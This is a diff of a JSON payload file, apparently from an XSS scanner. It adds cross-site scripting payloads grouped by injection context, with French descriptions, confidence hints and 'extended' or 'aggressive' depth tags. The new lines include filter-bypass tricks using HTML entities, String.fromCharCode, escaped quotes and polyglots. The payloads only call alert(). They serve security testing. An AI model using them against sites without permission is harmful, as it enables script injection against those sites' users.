@@ -6,29 +6,44 @@
       {"payload": "<script>alert(1)</script>", "description": "Script tag classique", "confidence_hint": 95},
       {"payload": "<svg onload=alert(1)>",     "description": "SVG avec onload", "confidence_hint": 90},
       {"payload": "<img src=x onerror=alert(1)>", "description": "Image broken + onerror", "confidence_hint": 90},
-      {"payload": "<details open ontoggle=alert(1)>", "description": "Detail toggle event", "confidence_hint": 85}
+      {"payload": "<details open ontoggle=alert(1)>", "description": "Detail toggle event", "confidence_hint": 85, "depth": "extended"},
+      {"payload": "<body onload=alert(1)>", "description": "Body onload — vecteur classique alternatif", "confidence_hint": 80, "depth": "extended"},
+      {"payload": "<select autofocus onfocus=alert(1)>", "description": "Autofocus — déclenche sans interaction utilisateur", "confidence_hint": 80, "depth": "extended"},
+      {"payload": "<marquee onstart=alert(1)>", "description": "Marquee onstart — tag peu filtré", "confidence_hint": 70, "depth": "aggressive"}
     ],
     "attribute_context": [
       {"payload": "\" onmouseover=\"alert(1)",  "description": "Break attribute + event handler", "confidence_hint": 85},
-      {"payload": "' onfocus='alert(1)' autofocus='", "description": "Auto-trigger via focus", "confidence_hint": 85}
+      {"payload": "' onfocus='alert(1)' autofocus='", "description": "Auto-trigger via focus", "confidence_hint": 85, "depth": "extended"},
+      {"payload": "\" autofocus onfocus=\"alert(1)", "description": "Variante double-quote de l'auto-trigger focus", "confidence_hint": 80, "depth": "extended"},
+      {"payload": "\" onmouseover=\"javaSCRIPT&colon;alert&lpar;1&rpar;", "description": "Obfuscation par entités HTML (bypass filtre mot-clé)", "confidence_hint": 70, "depth": "extended"},
+      {"payload": "\"><img src=x:x onerror=alert(1)>", "description": "Sort de l'attribut puis injecte un nouveau tag", "confidence_hint": 80, "depth": "extended"}
     ],
     "js_context": [
       {"payload": "';alert(1);//",              "description": "Sort de string + injecte", "confidence_hint": 95},
       {"payload": "\";alert(1);//",             "description": "Variante double-quote", "confidence_hint": 95},
-      {"payload": "</script><script>alert(1)</script>", "description": "Break script tag", "confidence_hint": 90}
+      {"payload": "</script><script>alert(1)</script>", "description": "Break script tag", "confidence_hint": 90, "depth": "extended"},
+      {"payload": "\\';alert(1);//", "description": "Neutralise l'échappement naïf (backslash avant le guillemet)", "confidence_hint": 70, "depth": "extended"},
+      {"payload": "';alert(String.fromCharCode(88,83,83));//", "description": "Obfuscation via String.fromCharCode (bypass filtre mot-clé)", "confidence_hint": 75, "depth": "extended"}
     ],
     "url_context": [
       {"payload": "javascript:alert(1)",         "description": "Pseudo-protocol", "confidence_hint": 80},
-      {"payload": "data:text/html,<script>alert(1)</script>", "description": "Data URI", "confidence_hint": 75}
+      {"payload": "data:text/html,<script>alert(1)</script>", "description": "Data URI", "confidence_hint": 75, "depth": "extended"},
+      {"payload": "javascript:alert(document.domain)", "description": "Variante confirmant le domaine", "confidence_hint": 75, "depth": "extended"},
+      {"payload": "javascript://%0aalert(1)//", "description": "Commentaire JS (//) + retour ligne — bypass filtre regex sur javascript:", "confidence_hint": 65, "depth": "aggressive"}
     ],
     "svg_context": [
-      {"payload": "<svg onload=alert(1)>", "description": "SVG onload", "confidence_hint": 85}
+      {"payload": "<svg onload=alert(1)>", "description": "SVG onload", "confidence_hint": 85},
+      {"payload": "<svg onload=&#97&#108&#101&#114&#116(1)>", "description": "Obfuscation par entités HTML du mot alert (bypass filtre mot-clé)", "confidence_hint": 65, "depth": "extended"},
+      {"payload": "<svg><animatetransform onbegin=alert(1) attributeName=x dur=1s></animatetransform></svg>", "description": "SVG animate — déclenche sans onload/onerror", "confidence_hint": 65, "depth": "aggressive"}
     ],
     "img_context": [
-      {"payload": "<img src=x onerror=alert(1)>", "description": "IMG onerror", "confidence_hint": 85}
+      {"payload": "<img src=x onerror=alert(1)>", "description": "IMG onerror", "confidence_hint": 85},
+      {"payload": "<img src=x onerror=\"alert(String.fromCharCode(88,83,83))\">", "description": "Obfuscation via String.fromCharCode (bypass filtre mot-clé)", "confidence_hint": 75, "depth": "extended"},
+      {"payload": "<img lowsrc=\"javascript:alert(1)\">", "description": "LOWSRC javascript: — vecteur historique (IE/Trident)", "confidence_hint": 50, "depth": "aggressive"}
     ],
     "polyglot": [
-      {"payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", "description": "Polyglot XSS multi-contexte", "confidence_hint": 90}
+      {"payload": "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e", "description": "Polyglot XSS multi-contexte", "confidence_hint": 90},
+      {"payload": "'\";!--\"<XSS>=&{()}", "description": "Polyglot court — casse quote/commentaire/tag simultanément", "confidence_hint": 60, "depth": "extended"}
     ]
   }
 }
